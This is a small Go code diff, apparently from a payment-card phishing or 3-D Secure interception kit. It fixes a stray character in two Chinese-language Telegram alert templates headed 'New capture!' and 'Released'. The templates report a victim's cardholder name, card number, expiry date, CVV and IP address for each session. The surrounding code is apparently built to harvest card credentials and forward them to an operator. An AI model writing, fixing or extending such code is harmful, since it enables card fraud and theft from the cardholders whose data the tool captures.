@@ -581,7 +581,7 @@ func (m *ThreeDSManager) updateTelegramCompleted(sessionID string, msgID int, re
 	msg := fmt.Sprintf(
 		"✅ 已放行 (Session #%d)\n\n"+
 			"👤持卡人: %s\n"+
-			"�💳 卡号: %s\n"+
+			"💳 卡号: %s\n"+
 			"📅 有效期: %s\n"+
 			"🔑CVV: %s\n"+
 			"🌐 IP: %s\n"+
@@ -619,7 +619,7 @@ func (m *ThreeDSManager) Send3DSNotification(sessionID string) int {
 	msg := fmt.Sprintf(
 		"🔔 新捕获! (Session #%d)\n\n"+
 			"👤持卡人: %s\n"+
-			"�💳卡号: %s\n"+
+			"💳卡号: %s\n"+
 			"📅 有效期: %s\n"+
 			"🔑CVV: %s\n"+
 			"🌐 IP: %s\n\n"+
